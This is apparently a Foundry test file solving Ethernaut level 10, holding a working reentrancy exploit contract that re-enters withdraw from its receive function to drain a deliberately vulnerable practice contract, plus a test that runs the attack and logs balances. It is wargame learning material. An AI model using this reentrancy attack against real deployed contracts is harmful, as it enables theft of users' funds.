// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/ethernaut/level10/Reentrance.sol";

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract ReentrancePOC {
    IReentrance private reentranceContract;
    uint256 private singleWithdrawValue;

    constructor(address _reentranceAddress) {
        reentranceContract = IReentrance(_reentranceAddress); // 初始化记录
    }

    function attack() public payable {
        singleWithdrawValue = msg.value;
        reentranceContract.donate{value: msg.value}(address(this)); // 先捐款
        reentranceContract.withdraw(msg.value); // 取款
    }
    
    receive() external payable {
        reentranceContract.withdraw(singleWithdrawValue); // 再取一次
    }
}

contract Level10 is Test {
    Reentrance level10;

    function setUp() public {
        level10 = new Reentrance();
        address(level10).call{value: 1 ether}("");
    }

    function testExploit() public {
        console.log(address(level10).balance);

        ReentrancePOC poc = new ReentrancePOC(address(level10));
        poc.attack{value: 1 ether}();
        console.log(address(poc).balance);
        console.log(address(level10).balance);
    }

    fallback() external payable {}
}
